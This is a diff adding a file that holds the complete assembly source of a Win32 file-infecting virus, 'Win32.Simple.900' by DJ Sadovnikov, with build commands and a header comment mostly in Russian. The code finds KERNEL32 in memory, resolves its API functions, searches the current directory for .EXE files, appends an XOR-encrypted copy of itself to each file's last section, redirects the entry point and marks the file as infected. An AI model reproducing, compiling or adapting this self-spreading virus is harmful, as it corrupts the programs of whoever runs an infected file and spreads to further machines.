@@ -1,0 +1,471 @@
+COMMENT %
+
+  PE-EXE.CRYPT. A very simple non-tsr Win32 virus. Scannes for
+  files in the current directory and infects it by appending to
+  the last section.
+
+   Это очень простой вирус для Win32. К сожалению, он вышел только сейчас -
+я был занят другими делами, и у меня только недавно появилась возможность
+поставить WindowsNT и SoftIce для него, чтобы испытать этот продукт. И, как
+оказалось, не зря, так как я обнаружил одну мелкую ошибку, из-за которой,
+однако, вирус не работал под WindowsNT. Теперь, естественно, все в порядке.
+   О самом вирусе: нерезидентный, шифрованный; ищет и заражает PE-файлы в
+текущей директории (дописывается к последней секции). Для работы с файлами
+используются API из KERNEL32, адрес которого берется из стэка. Никак не
+проявляется.
+
+                                  DJ Sadovnikov (http://i.am/djsad), 26.01.2001
+
+ ══════════════════════════════════════════════════════════════════════════════
+
+              Компилировать с помощью TASM32 5.0r
+
+                 tasm32 /m /ml simple.asm
+                 tlink32 /Tpe /x simple.obj,,,import32.lib
+                 pewrsec simple.exe
+                 del simple.obj
+
+
+              Файлы из архива:
+
+                 simple.asm  8900  (исходник вируса)
+                 simple.exe  8192  (бинарник вируса)
+                 simple.doc  8300  (техническая информация)
+%
+
+
+
+
+
+
+
+
+
+
+
+
+;══════════════════════════════════════════════════════════════════════════════
+
+		.386
+		.model	flat
+
+extrn		MessageBoxA:proc
+extrn		ExitProcess:proc
+
+		.data
+
+Message		db	'Virus has started...',0
+
+		.code
+
+Start:		push	0
+		push	offset Message
+		push	offset Message
+		push	0
+		call	MessageBoxA
+		push	0
+		call	ExitProcess
+
+;══════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+
+
+
+
+
+
+
+
+;══════════════════════════════════════════════════════════════════════════════
+;                            НАЧАЛО ВИРУСА
+;══════════════════════════════════════════════════════════════════════════════
+
+Virus:		pushad
+		call	Entry
+Entry:		pop	ebp
+
+
+;[Расшифровываем вирус]
+
+Key:		mov	ax, 0
+		mov	esi, Crypt-Entry
+Loop1:		xor	[esi+ebp], al
+		add	al, ah
+		inc	esi
+		cmp	esi, CodeSize+Virus-Entry
+		jne	Loop1
+
+
+;[Сохраняем в стеке адрес возврата в программу-носитель]
+
+Crypt:		db	68h
+RetAddress	dd	Start-(RetAddr+4)
+
+;══════════════════════════════════════════════════════════════════════════════
+
+;[Ищем в памяти KERNEL32 и сохраняем его адрес в EDX]
+
+		mov	ebx, [esp+24h]
+		and	bx, 0F000h
+FindKernel:	sub	ebx, 1000h
+		cmp	[ebx], word ptr 'ZM'
+		jne	FindKernel
+		mov	edx, ebx
+		mov	[KernelAddr-Entry+ebp], ebx
+
+
+;[Устанавливаем EBX на таблицу экспортов]
+
+		mov	esi, [ebx+3Ch]
+		add	esi, ebx
+		cmp	[esi], dword ptr 'EP'
+		jne	Exit
+		add	ebx, [esi+78h]
+
+
+;[Подготавливаем регистры для поиска строки "GetProcAddress"]
+
+		mov	ecx, [ebx+18h]
+		mov	esi, [ebx+20h]
+		mov	edi, [ebx+24h]
+		add	esi, edx
+		add	edi, edx
+
+
+;[Ищем стоку "GetProcAddress"]
+
+		cld
+Search:		lodsd
+		add	eax, edx
+
+		push	ecx
+		push	edi
+		xchg	esi, eax
+
+		lea	edi, [GetProcAddress-Entry+ebp]
+		mov	ecx, APINameSize
+		repe	cmpsb
+
+		xchg	esi, eax
+		pop	edi
+		pop	ecx
+		je	Found
+
+		inc	edi
+		inc	edi
+		loop	Search
+		jmp	Exit
+
+
+;[Вычисляем адрес функции "GetProcAddress"]
+
+Found:		movzx	eax, word ptr [edi]
+		shl	eax, 2
+		mov	esi, [ebx+1Ch]
+		add	esi, edx
+		add	esi, eax
+		lodsd
+		add	eax, edx
+		mov	[GetProcAddr-Entry+ebp], eax
+
+;══════════════════════════════════════════════════════════════════════════════
+
+;[Находим первый файл в текущей директории]
+
+		lea	eax, [DTA-Entry+ebp]
+		push	eax
+		lea	eax, [FMask-Entry+ebp]
+		push	eax
+		lea	eax, [FindFirstFileA-Entry+ebp]
+		call	CallAPI
+
+		cmp	eax, -1
+		je	Exit
+		mov	[SearchHandle-Entry+ebp], eax
+
+
+;[Открываем файл]
+
+Infect:		xor	eax, eax
+		push	eax
+		push	eax
+		push	3
+		push	eax
+		push	eax
+		push	0C0000000h
+		lea	eax, [DTA+2Ch-Entry+ebp]
+		push	eax
+		lea	eax, [CreateFileA-Entry+ebp]
+		call	CallAPI
+
+		cmp	eax, -1
+		je	FindNext
+		mov	ebx, eax
+
+
+;[Считываем четыре байта по смещению 3Ch]
+
+		mov	eax, 3Ch
+		call	Seek
+		mov	ecx, 4
+		lea	edx, [HeaderOfs-Entry+ebp]
+		call	Read
+
+
+;[Считываем PE заголовок]
+
+		mov	eax, [HeaderOfs-Entry+ebp]
+		call	Seek
+		mov	ecx, HeaderSize
+		lea	edx, [Header-Entry+ebp]
+		call	Read
+
+
+;[Проверяем тип файла и его зараженность]
+
+		cmp	[Header-Entry+ebp], dword ptr 'EP'
+		jne	Close
+		cmp	[Header+58h-Entry+ebp], '6666'
+		je	Close
+
+
+;[Вычисляем смещение последнего элемента таблице объектов]
+
+		xor	eax, eax
+		imul	ax, [Header+06h-Entry+ebp], ObjectSize
+		add	ax, [Header+14h-Entry+ebp]
+		add	ax, 18h-ObjectSize
+		add	eax, [HeaderOfs-Entry+ebp]
+		mov	[ObjectOfs-Entry+ebp], eax
+
+
+;[Считываем в память последний элемент таблицы объектов]
+
+		call	Seek
+		mov	ecx, ObjectSize
+		lea	edx, [Object-Entry+ebp]
+		call	Read
+
+
+;[Сравниваем физический и виртуальный размеры объекта]
+
+		mov	eax, [Object+10h-Entry+ebp]
+		cmp	[Object+08h-Entry+ebp], eax
+		jae	L1
+		mov	[Object+08h-Entry+ebp], eax
+
+
+;[Сохраняем старую и вычисляем новую точку входа]
+
+L1:		add	eax, [Object+0Ch-Entry+ebp]
+		mov	ecx, [Header+28h-Entry+ebp]
+		sub	ecx, eax
+		sub	ecx, RetAddr+4-Virus
+		mov	[RetAddress-Entry+ebp], ecx
+		mov	[Header+28h-Entry+ebp], eax
+
+
+;[Корректируем размер файла]
+
+		add	eax, VirSize
+		mov	[Header+50h-Entry+ebp], eax
+
+
+;[Вычисляем смещение, по которому нужно записать вирус]
+
+		mov	eax, [Object+14h-Entry+ebp]
+		add	eax, [Object+10h-Entry+ebp]
+		call	Seek
+
+
+;[Корректируем виртуальный и физический размеры последнего объекта]
+
+		add	[Object+08h-Entry+ebp], dword ptr VirSize
+		add	[Object+10h-Entry+ebp], dword ptr CodeSize
+
+
+;[Устанавливаем у последнего объекта атрибуты чтения/записи]
+
+		or	[Object+24h-Entry+ebp], 0A0000020h
+
+
+;[Устанавливаем признак зараженности]
+
+		mov	[Header+58h-Entry+ebp], '6666'
+
+
+;[Получаем случайный ключ для шифровки]
+
+		lea	eax, [GetTickCount-Entry+ebp]
+		call	CallAPI
+		mov	[Key+2-Entry+ebp], ax
+
+
+;[Копируем вирус в буффер]
+
+		lea	esi, [Virus-Entry+ebp]
+		lea	edi, [Buffer-Entry+ebp]
+		mov	ecx, CodeSize
+		cld
+		rep	movsb
+
+
+;[Шифруем основное тело вируса в буффере]
+
+		mov	esi, (Buffer-Entry)+(Crypt-Virus)
+Loop2:		xor	[esi+ebp], al
+		add	al, ah
+		inc	esi
+		cmp	esi, (Buffer-Entry)+CodeSize
+		jne	Loop2
+
+
+;[Записываем код вируса в файл]
+
+		mov	ecx, CodeSize
+		lea	edx, [Buffer-Entry+ebp]
+		call	Write
+
+
+;[Записываем PE заголовок]
+
+		mov	eax, [HeaderOfs-Entry+ebp]
+		call	Seek
+		mov	ecx, HeaderSize
+		lea	edx, [Header-Entry+ebp]
+		call	Write
+
+
+;[Записываем последний элемент таблицы объектов]
+
+		mov	eax, [ObjectOfs-Entry+ebp]
+		call	Seek
+		mov	ecx, ObjectSize
+		lea	edx, [Object-Entry+ebp]
+		call	Write
+
+
+;[Закрываем файл]
+
+Close:		push	ebx
+		lea	eax, [CloseHandle-Entry+ebp]
+		call	CallAPI
+
+
+;[Ищем следующий файл]
+
+FindNext:	lea	eax, [DTA-Entry+ebp]
+		push	eax
+		push	dword ptr [SearchHandle-Entry+ebp]
+		lea	eax, [FindNextFileA-Entry+ebp]
+		call	CallAPI
+		or	eax, eax
+		jnz	Infect
+
+
+;[Отдаем управление программе-носителю]
+
+Exit:		pop	dword ptr [RetAddr-Entry+ebp]
+		popad
+
+		db	0E9h
+RetAddr		dd	0
+
+;══════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+
+
+
+
+
+
+
+
+;══════════════════════════════════════════════════════════════════════════════
+;                            ПОДПРОГРАММЫ
+;══════════════════════════════════════════════════════════════════════════════
+
+Seek:		push	0
+		push	0
+		push	eax
+		lea	eax, [SetFilePointer-Entry+ebp]
+		jmp	L3
+Read:		lea	eax, [ReadFile-Entry+ebp]
+		jmp	L2
+Write:		lea	eax, [WriteFile-Entry+ebp]
+L2:		push	0
+		lea	edi, [Bytes-Entry+ebp]
+		push	edi
+		push	ecx
+		push	edx
+L3:		push	ebx
+		call	CallAPI
+		ret
+
+
+CallAPI:	push	eax
+		db	068h
+KernelAddr	dd	0
+		db	0B8h
+GetProcAddr	dd	0
+		call	eax
+		jmp	eax
+
+;══════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+
+
+
+
+
+
+
+
+;══════════════════════════════════════════════════════════════════════════════
+;                                ДАННЫЕ
+;══════════════════════════════════════════════════════════════════════════════
+
+VirName		db	'Win32.Simple.900 -- Copyright (c) by DJ Sadovnikov'
+
+DTASize		=	13Eh
+HeaderSize	=	5Ch
+ObjectSize	=	28h
+APINameSize	=	15
+
+GetProcAddress	db	'GetProcAddress',0
+CreateFileA	db	'CreateFileA',0
+FindFirstFileA	db	'FindFirstFileA',0
+FindNextFileA	db	'FindNextFileA',0
+SetFilePointer	db	'SetFilePointer',0
+ReadFile	db	'ReadFile',0
+WriteFile	db	'WriteFile',0
+CloseHandle	db	'CloseHandle',0
+GetTickCount	db	'GetTickCount',0
+FMask		db	'*.EXE',0
+
+CodeSize	=	$ - Virus
+
+HeaderOfs	dd	?
+ObjectOfs	dd	?
+SearchHandle	dd	?
+Bytes		dd	?
+Object		db	ObjectSize dup (?)
+Header		db	HeaderSize dup (?)
+DTA		db	DTASize dup (?)
+Buffer		db	CodeSize dup (?)
+
+VirSize		=	$ - Virus
+
+		end	Virus
